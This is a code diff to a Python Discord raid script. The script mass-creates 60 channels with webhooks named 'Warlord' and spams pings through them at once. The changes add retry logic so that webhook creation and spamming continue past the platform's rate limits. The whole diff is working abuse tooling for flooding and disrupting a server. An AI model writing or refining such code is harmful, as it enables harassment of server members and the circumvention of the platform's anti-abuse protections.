@@ -92,12 +92,10 @@ async def create_channels_webhooks_and_spam(guild):
             print(f"[+] Created Channel: {name}")
             channels.append(channel)
 
-            webhook = await channel.create_webhook(name="Warlord")
-            print(f"[+] Created Webhook in {channel.name}")
-            webhooks.append(webhook)
+            await create_webhook_with_retry(channel, webhooks)
 
             # Start spamming immediately
-            asyncio.create_task(spam_webhook(webhook))
+            asyncio.create_task(spam_webhook(webhooks[-1]))
 
         tasks = [create_channel_and_webhook() for _ in range(60)]
         await asyncio.gather(*tasks)
@@ -105,6 +103,22 @@ async def create_channels_webhooks_and_spam(guild):
 
     except Exception as e:
         print(f"Error during channel/webhook creation: {e}")
+
+# Create Webhook with Retry (5-Second Delay on Rate Limit)
+async def create_webhook_with_retry(channel, webhooks):
+    while True:
+        try:
+            webhook = await channel.create_webhook(name="Warlord")
+            print(f"[+] Created Webhook in {channel.name}")
+            webhooks.append(webhook)
+            return
+        except discord.HTTPException as e:
+            if e.status == 429:
+                print(f"[!] Rate Limited on Webhook Creation. Retrying in 5 seconds...")
+                await asyncio.sleep(5)
+            else:
+                print(f"[!] Failed to Create Webhook: {e}")
+                return
 
 # Spam Webhooks (Simultaneously)
 async def spam_webhook(webhook):
@@ -121,9 +135,8 @@ async def spam_webhook(webhook):
                             print(f"[!] Stopped at {MAX_PINGS} Pings.")
                             return
                     elif response.status == 429:
-                        retry_after = random.randint(2, 6)
-                        print(f"[!] Rate Limited. Retrying in {retry_after} seconds...")
-                        await asyncio.sleep(retry_after)
+                        print(f"[!] Rate Limited. Retrying in 5 seconds...")
+                        await asyncio.sleep(5)
             except Exception as e:
                 print(f"[!] Error Spamming Webhook {webhook.name}: {e}")
 
